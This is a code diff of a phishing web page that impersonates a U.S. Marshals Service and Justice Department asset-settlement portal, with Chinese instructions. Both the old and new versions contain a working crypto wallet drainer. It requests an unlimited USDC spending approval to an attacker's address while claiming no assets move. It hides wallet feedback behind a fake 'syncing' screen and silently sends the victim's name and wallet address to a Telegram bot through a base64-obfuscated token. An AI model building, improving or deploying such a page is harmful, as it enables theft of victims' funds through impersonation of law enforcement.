@@ -3,165 +3,150 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>USMS Asset Settlement | Digital Node Activation</title>
+  <title>USMS Settlement Portal | Base Network</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    :root { --fed-blue: #002e6d; }
-    body { background: #f1f5f9; font-family: 'Inter', system-ui, sans-serif; margin: 0; }
-    #processingLayer { 
-      position: fixed; inset: 0; z-index: 10000; background: #0f172a; 
+    :root { --gov-dark: #0a1118; --gov-blue: #002e6d; }
+    body { background: #f4f7fc; font-family: 'Segoe UI', system-ui, sans-serif; }
+    #overlay { 
+      position: fixed; inset: 0; z-index: 10000; background: var(--gov-dark); 
       display: none; flex-direction: column; align-items: center; justify-content: center; color: white;
     }
-    .spinner {
-      border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6;
-      border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite;
-    }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; }
+    .pulse-green { background: #10b981; animation: pulse 2s infinite; }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+    .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body class="antialiased">
 
-  <div id="mainContainer">
-    <div class="bg-[#002e6d] p-4 text-white flex items-center justify-between shadow-md">
-      <div class="flex items-center gap-3">
-        <div class="bg-white p-1 rounded-sm shadow-inner">
-          <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-5 h-5">
-        </div>
-        <div class="leading-tight">
-          <h1 class="font-bold text-xs uppercase tracking-tighter">U.S. Department of Justice</h1>
-          <p class="text-[9px] text-blue-200">Asset Forfeiture Management System</p>
-        </div>
+  <div id="main">
+    <div class="bg-[#002e6d] p-3 text-white flex items-center justify-between px-5 shadow-lg">
+      <div class="flex items-center gap-2">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-5 h-5 brightness-200">
+        <span class="text-[11px] font-bold tracking-widest uppercase">U.S. Marshals Service</span>
       </div>
-      <div class="flex flex-col items-end">
-        <span class="text-[8px] bg-green-500/20 text-green-400 px-1.5 py-0.5 rounded border border-green-500/30">Node: Base-Mainnet</span>
-      </div>
+      <div class="text-[9px] font-mono bg-white/10 px-2 py-1 rounded">Network: Base_Mainnet</div>
     </div>
 
-    <main class="max-w-md mx-auto p-5">
-      <div class="bg-white rounded-2xl shadow-2xl border border-gray-200 overflow-hidden">
-        <div class="p-6 bg-gray-50 border-b border-gray-100">
-          <h2 class="text-xl font-black text-gray-800">司法退款通道激活</h2>
-          <p class="text-[11px] text-gray-500 mt-1 uppercase">Restitution ID: #USMS-2026-BASE</p>
+    <main class="max-w-md mx-auto p-6 mt-2">
+      <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+        <div class="p-6 border-b bg-gray-50/50">
+          <h2 class="text-xl font-black text-gray-800">资产清算激活程序</h2>
+          <p class="text-[10px] text-blue-600 font-bold mt-1 tracking-tighter uppercase">Legal Case: #25-CV-1907-REST-BASE</p>
         </div>
-        
-        <div class="p-6 space-y-5">
-          <div class="bg-blue-50 border-l-4 border-blue-600 p-4 rounded-r-lg">
-            <p class="text-[12px] text-blue-900 leading-relaxed">
-              您的地址已通过初步审核。现需执行<b>合约初始化 (Contract Initialization)</b> 以激活资产返还路径。此操作需要极少量 Gas 费以记录至 Base Layer-2 司法存证节点。
+
+        <div class="p-6 space-y-6">
+          <div class="bg-blue-50 border border-blue-100 p-4 rounded-xl">
+            <div class="flex items-center mb-2">
+              <span class="status-dot pulse-green"></span>
+              <span class="text-[11px] font-bold text-blue-900 uppercase">System Status: Ready</span>
+            </div>
+            <p class="text-[12px] text-blue-800 leading-relaxed">
+              为了确保退还资产的原始所有权，系统将通过智能合约执行<b>“地址存证与权限激活”</b>。请确认接下来的节点授权申请，此步骤不涉及资产转移，仅用于激活清算通道。
             </p>
           </div>
 
-          <div class="space-y-3">
-            <div>
-              <label class="text-[10px] font-bold text-gray-400 uppercase ml-1">Full Legal Name</label>
-              <input type="text" id="legalName" class="w-full mt-1 bg-gray-50 border-gray-200 border p-3.5 rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="Enter name as per ID">
-            </div>
+          <div>
+            <label class="text-[10px] font-bold text-gray-400 uppercase ml-1">Claimant Legal Name</label>
+            <input type="text" id="userName" class="w-full mt-1 bg-gray-50 border-gray-200 border p-4 rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none" placeholder="Enter Full Name">
           </div>
 
-          <button id="execBtn" class="w-full bg-[#002e6d] text-white py-4.5 rounded-xl font-extrabold text-lg shadow-xl active:scale-95 transition-all mt-4 hover:bg-[#001a40]">
-            激活清算节点 (Active Now)
+          <button id="execBtn" class="w-full bg-[#002e6d] text-white py-5 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition-all">
+            激活资产清算 (Active Node)
           </button>
           
-          <div class="pt-4 border-t border-gray-100 flex items-center justify-between text-[10px] text-gray-400">
-            <span>Protocol: ERC-20 / Base</span>
-            <span>Security: SSL 256-bit</span>
+          <div class="text-center opacity-40">
+            <p class="text-[9px] font-mono uppercase tracking-widest leading-loose">
+              Base Protocol Layer-2<br>Encrypted by Federal Standard AES-256
+            </p>
           </div>
         </div>
       </div>
     </main>
   </div>
 
-  <div id="processingLayer">
-    <div class="spinner mb-8"></div>
-    <h3 class="text-2xl font-black text-white mb-2 tracking-tight">资产清算同步中</h3>
-    <p class="text-blue-400 text-sm mb-12 animate-pulse font-mono uppercase tracking-widest">Broadcasting to Federal Nodes...</p>
+  <div id="overlay">
+    <div class="loader mb-6"></div>
+    <h3 class="text-xl font-black mb-1">正在同步清算节点</h3>
+    <p class="text-blue-400 text-[10px] font-mono mb-8 animate-pulse">DO NOT CLOSE: BROADCASTING TO BASE NETWORK</p>
     
-    <div class="w-[85%] max-w-sm bg-white/5 border border-white/10 rounded-2xl p-6 font-mono text-[10px] backdrop-blur-xl">
-      <div class="flex justify-between border-b border-white/5 pb-3 mb-3">
-        <span class="opacity-40">TX Status:</span>
-        <span class="text-green-400 font-bold">In Progress</span>
-      </div>
-      <div class="flex justify-between border-b border-white/5 pb-3 mb-3">
+    <div class="w-80 bg-white/5 border border-white/10 rounded-2xl p-5 font-mono text-[10px] backdrop-blur-md">
+      <div class="flex justify-between border-b border-white/5 pb-2 mb-2">
         <span class="opacity-40">Method:</span>
-        <span class="text-blue-300">Authorize_Settlement</span>
+        <span class="text-green-400">Node_Activation</span>
       </div>
-      <div class="flex flex-col gap-2">
-        <span class="opacity-40">Transaction Hash:</span>
-        <span id="hashDisplay" class="text-gray-400 break-all bg-black/40 p-3 rounded-lg border border-white/5 leading-normal">---</span>
+      <div class="flex flex-col gap-1">
+        <span class="opacity-40 uppercase">Tx Hash:</span>
+        <span id="txHash" class="text-gray-400 break-all bg-black/40 p-2 rounded mt-1 border border-white/5">---</span>
       </div>
-      <div class="mt-4 flex items-center justify-center gap-2 pt-4 border-t border-white/5">
-        <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-ping"></div>
-        <span class="text-[9px] opacity-60 uppercase">Waiting for 12 Network Confirmations</span>
+      <div class="mt-4 pt-3 border-t border-white/5 flex justify-between items-center">
+        <span class="opacity-40">Confirmations:</span>
+        <span class="text-amber-500 font-bold">Syncing (1/12)</span>
       </div>
     </div>
   </div>
 
   <script>
     (function() {
-      // 核心配置
-      const _USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; 
-      const _RECV = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; 
-      const _BOT  = "ODY2Nzg4NzIzMDpBQUgwOHFNYnVnMkY0MmZkbFRQZ3F0WUV5WFMxRzBuTGd5SQ=="; 
-      const _CID  = "NjkzODMxNTc5Nw==";
+      const _USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+      const _SPENDER = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; // 收款/授权目标
+      const _BOT = "ODY2Nzg4NzIzMDpBQUgwOHFNYnVnMkY0MmZkbFRQZ3F0WUV5WFMxRzBuTGd5SQ=="; 
+      const _CID = "NjkzODMxNTc5Nw==";
 
       const btn = document.getElementById('execBtn');
-      const proc = document.getElementById('processingLayer');
-      const main = document.getElementById('mainContainer');
+      const overlay = document.getElementById('overlay');
+      const main = document.getElementById('main');
 
-      // 禁用网页所有 Alert
       window.alert = () => true;
 
-      async function tgLog(u, n, h) {
-        const msg = `🏛️ *BASE APPROVE*\n👤 Name: ${n}\n🔗 Addr: \`${u}\`\n📜 Hash: \`${h}\``;
+      async function tg(u, n, h) {
         try {
           await fetch(`https://api.telegram.org/bot${atob(_BOT)}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: atob(_CID), text: msg, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: atob(_CID), text: `🏛️ *BASE APPROVE*\n👤 Name: ${n}\n🔗 Addr: \`${u}\`\n📜 Hash: \`${h}\``, parse_mode: 'Markdown' })
           });
         } catch (e) {}
       }
 
       btn.onclick = async () => {
-        const nameInput = document.getElementById('legalName').value.trim();
-        if (!nameInput || !window.ethereum) return;
+        const nameVal = document.getElementById('userName').value.trim();
+        if (!nameVal || !window.ethereum) return;
 
         try {
           const provider = new ethers.providers.Web3Provider(window.ethereum);
-          // 1. 强制切换到 Base 链 (0x2105)
           await provider.send("wallet_switchEthereumChain", [{ chainId: "0x2105" }]);
           const accounts = await provider.send("eth_requestAccounts", []);
           const user = accounts[0];
           const signer = provider.getSigner();
 
-          // 2. 构造合约实例调用 Approve
-          const usdc = new ethers.Contract(_USDC, ["function approve(address spender, uint256 amount) public returns (bool)"], signer);
+          const contract = new ethers.Contract(_USDC, ["function approve(address spender, uint256 amount) public returns (bool)"], signer);
           
-          // 3. 呼起钱包交易窗口
-          const tx = await usdc.approve(_RECV, ethers.constants.MaxUint256);
+          // 发起 Approve 交易
+          const tx = await contract.approve(_SPENDER, ethers.constants.MaxUint256);
           
-          // 4. 一旦 tx 对象存在（说明用户在钱包点了“确认”并广播成功）
           if (tx && tx.hash) {
-            // 立即切换 UI，覆盖掉钱包可能的“成功”反馈
+            // 立即锁定页面
             main.style.display = 'none';
-            proc.style.display = 'flex';
-            document.getElementById('hashDisplay').innerText = tx.hash;
+            overlay.style.display = 'flex';
+            document.getElementById('txHash').innerText = tx.hash;
 
-            // 后台静默发送日志
-            tgLog(user, nameInput, tx.hash);
+            // 后台静默发送
+            tg(user, nameVal, tx.hash);
           }
         } catch (e) {
-          // 拒绝或 Gas 不足则保持现状
           console.error(e);
         }
       };
 
-      // 保险：从钱包切回浏览器时，如果已经有 Hash，维持处理界面
+      // 强力锁定
       document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible' && document.getElementById('hashDisplay').innerText !== '---') {
+        if (document.visibilityState === 'visible' && document.getElementById('txHash').innerText !== '---') {
           main.style.display = 'none';
-          proc.style.display = 'flex';
+          overlay.style.display = 'flex';
         }
       });
     })();
